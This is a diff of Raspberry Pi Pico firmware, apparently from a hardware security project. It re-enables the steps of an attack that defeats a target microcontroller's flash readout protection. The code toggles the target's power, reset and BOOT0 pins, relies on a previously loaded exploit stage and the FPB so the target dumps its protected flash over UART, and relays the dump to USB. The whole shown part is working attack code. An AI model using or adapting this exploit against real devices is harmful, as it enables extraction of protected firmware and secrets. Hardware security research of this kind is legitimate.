@@ -115,7 +115,8 @@ int main()
 	// -- Ensure that the target exploit firmware has been loaded into the target's SRAM before preceeding --
 
 	// Wait for any serial input to start the attack
-	while (getchar_timeout_us(0) == PICO_ERROR_TIMEOUT) {
+	while (getchar_timeout_us(0) == PICO_ERROR_TIMEOUT)
+	{
 		tight_loop_contents();
 	}
 
@@ -124,7 +125,8 @@ int main()
 	gpio_put(POWER_PIN, 0);
 
 	// Wait for reset to go low
-	while (gpio_get(RESET_PIN)) {
+	while (gpio_get(RESET_PIN))
+	{
 		tight_loop_contents();
 	}
 
@@ -142,56 +144,56 @@ int main()
 	// disable readout protection.
 	gpio_put(BOOT0_PIN, 0);
 
-	// // Reset the target
-	// gpio_set_dir(RESET_PIN, GPIO_OUT);
-	// gpio_put(RESET_PIN, 0);
+	// Reset the target
+	gpio_set_dir(RESET_PIN, GPIO_OUT);
+	gpio_put(RESET_PIN, 0);
 
-	// // Wait for reset
-	// sleep_ms(15);
+	// Wait for reset
+	sleep_ms(15);
 
-	// // Release reset
-	// // Due to the FPB, the target will now jump to
-	// // stage 2 of the exploit and dump the contents
-	// // of the flash over UART
-	// gpio_set_dir(RESET_PIN, GPIO_IN);
-	// gpio_pull_up(RESET_PIN);
+	// Release reset
+	// Due to the FPB, the target will now jump to
+	// stage 2 of the exploit and dump the contents
+	// of the flash over UART
+	gpio_set_dir(RESET_PIN, GPIO_IN);
+	gpio_pull_up(RESET_PIN);
 
-	// // Wait for dump start magic to ensure
-	// // that we don't forward any garbage data
-	// // caused by the reset
-	// uint magic_index = 0;
-	// while (true)
-	// {
-	// 	char c = uart_getc(UART_ID);
-	// 	if (c == DUMP_START_MAGIC[magic_index])
-	// 	{
-	// 		if (++magic_index == sizeof(DUMP_START_MAGIC))
-	// 		{
-	// 			break;
-	// 		}
-	// 	}
-	// 	else
-	// 	{
-	// 		magic_index = 0;
-	// 	}
-	// }
+	// Wait for dump start magic to ensure
+	// that we don't forward any garbage data
+	// caused by the reset
+	uint magic_index = 0;
+	while (true)
+	{
+		char c = uart_getc(UART_ID);
+		if (c == DUMP_START_MAGIC[magic_index])
+		{
+			if (++magic_index == sizeof(DUMP_START_MAGIC))
+			{
+				break;
+			}
+		}
+		else
+		{
+			magic_index = 0;
+		}
+	}
 
-	// // Forward dumped data from UART to USB serial
-	// uint stalls = 0;
-	// while (true)
-	// {
-	// 	if (uart_is_readable(UART_ID))
-	// 	{
-	// 		char c = uart_getc(UART_ID);
-	// 		putchar(c);
-	// 		pwm_set_gpio_level(LED_PIN, c); // LED will change intensity based on UART data
-	// 		stalls = 0;
-	// 	}
-	// 	else
-	// 	{
-	// 		// If no data is received for a while, turn off the LED
-	// 		if (++stalls == UART_STALLS_FOR_LED_OFF)
-	// 			pwm_set_gpio_level(LED_PIN, 0);
-	// 	}
-	// }
+	// Forward dumped data from UART to USB serial
+	uint stalls = 0;
+	while (true)
+	{
+		if (uart_is_readable(UART_ID))
+		{
+			char c = uart_getc(UART_ID);
+			putchar(c);
+			pwm_set_gpio_level(LED_PIN, c); // LED will change intensity based on UART data
+			stalls = 0;
+		}
+		else
+		{
+			// If no data is received for a while, turn off the LED
+			if (++stalls == UART_STALLS_FOR_LED_OFF)
+				pwm_set_gpio_level(LED_PIN, 0);
+		}
+	}
 }
